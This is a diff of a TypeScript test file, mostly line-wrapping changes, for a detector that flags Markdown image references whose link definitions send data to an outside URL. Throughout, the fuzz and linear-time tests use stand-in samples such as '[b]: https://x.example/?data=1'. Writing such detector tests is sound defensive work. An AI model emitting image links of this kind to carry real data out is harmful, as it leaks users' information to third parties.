-        expect.fail(`case ${n}\ninput: ${JSON.stringify(text).replace(/[\u2028\u2029]/g, (c) => '\\u' + c.charCodeAt(0).toString(16))}\nexpected: ${JSON.stringify(expected)}\nactual: ${JSON.stringify(actual)}`);
+        expect.fail(
+          `case ${n}\ninput: ${JSON.stringify(text).replace(/[\u2028\u2029]/g, (c) => '\\u' + c.charCodeAt(0).toString(16))}\nexpected: ${JSON.stringify(expected)}\nactual: ${JSON.stringify(actual)}`,
+        );
       }
     }
     // A fuzz that never produces a match proves nothing.
@@ -609,7 +920,10 @@ describe('matches a slow reference on generated documents (#219)', () => {
 
 describe('stays linear (#219)', () => {
   const shapes: Array<[string, string]> = [
-    ['dense images, one flagged definition', '![a][b]'.repeat(40) + '\n[b]: https://x.example/?data=1\n'],
+    [
+      'dense images, one flagged definition',
+      '![a][b]'.repeat(40) + '\n[b]: https://x.example/?data=1\n',
+    ],
     ['dense images, no definition', '![a][b]'],
     ['many flagged definitions', '[b]: https://x.example/?data=1\n'],
     ['definitions with long labels', '[' + 'l'.repeat(199) + ']: https://x.example/?data=1\n'],
@@ -622,7 +936,7 @@ describe('stays linear (#219)', () => {
     ['long indent before a bracket', ' '.repeat(1000) + '[\n'],
     ['block quote markers', '> > > > > > [b]: https://x.example/?data=1\n'],
     ['image openers over one far bracket', '![![![![![![![![![![x]'],
-    ['openers sharing one huge label', '![' .repeat(2000) + 'x][' + 'r'.repeat(300000) + ']'],
+    ['openers sharing one huge label', '!['.repeat(2000) + 'x][' + 'r'.repeat(300000) + ']'],
     ['many labels read once each', '![a][' + 'x'.repeat(50) + ']\n'],
     ['backtick spans around brackets', '![a `]` b][r]\n\n[r]: https://x.example/?data=1\n'],
     ['unmatched backticks', '`x ![a][r] [r]: https://x.example/?data=1\n'],
@@ -658,18 +972,29 @@ describe('stays linear (#219)', () => {
     ['indented code lines', '    x\n'],
     ['quotes and lists nested on one line', '> - > 1. > - '],
     ['fences in list items', '- ```\n  x\n'],
-    ['list fences and quotes', '> - ```\n>   x\n>   ```\n- ```\n![a `]` b][r]\n[r]: https://x.example/?data=1\n'],
-    ['thematic breaks and quote depth', '***\n> x\n>> y\n---\n![a][r]\n[r]: https://x.example/?data=1\n'],
+    [
+      'list fences and quotes',
+      '> - ```\n>   x\n>   ```\n- ```\n![a `]` b][r]\n[r]: https://x.example/?data=1\n',
+    ],
+    [
+      'thematic breaks and quote depth',
+      '***\n> x\n>> y\n---\n![a][r]\n[r]: https://x.example/?data=1\n',
+    ],
     ['headings and fences', '# [\n```\n[\n```\n- [\n![a][r]\n[r]: https://x.example/?data=1\n'],
     ['nested open brackets', '[[[[[[[[[[[[[[[['],
     ['image openers with nested brackets', '![[![[![[!['],
     ['backslash runs', '\\\\\\\\\\[x\\\\\\\\\\]'],
-    ['long label split by line breaks', '[' + 'word\n'.repeat(150) + ']: https://x.example/?data=1\n'],
+    [
+      'long label split by line breaks',
+      '[' + 'word\n'.repeat(150) + ']: https://x.example/?data=1\n',
+    ],
     ['alt text spanning many lines', '![' + 'line\n'.repeat(150) + '][b]\n'],
     ['blank lines between brackets', '![a\n\n][b\n\n]\n'],
   ];
   it('a staircase of ever deeper list items scans in well under a second', () => {
-    const text = Array.from({ length: 700 }, (_, i) => ' '.repeat(i * 2) + '- x\n').join('') + '\n[zz]: https://x.example/?data=1\n';
+    const text =
+      Array.from({ length: 700 }, (_, i) => ' '.repeat(i * 2) + '- x\n').join('') +
+      '\n[zz]: https://x.example/?data=1\n';
     const start = performance.now();
     detector.scan(text);
     expect(performance.now() - start).toBeLessThan(2000);
@@ -682,7 +1007,8 @@ describe('stays linear (#219)', () => {
   });
   it.each(shapes)('1,000,000 characters of %s scan in well under a second', (_name, unit) => {
     // A flagged definition makes the scan read brackets and blocks, so every shape reaches the slow paths.
-    const text = unit.repeat(Math.ceil(1_000_000 / unit.length)) + '\n[zz]: https://x.example/?data=1\n';
+    const text =
+      unit.repeat(Math.ceil(1_000_000 / unit.length)) + '\n[zz]: https://x.example/?data=1\n';
     const start = performance.now();
     detector.scan(text);
     // The CI runner is several times slower than a laptop and runs test files in parallel; a quadratic path
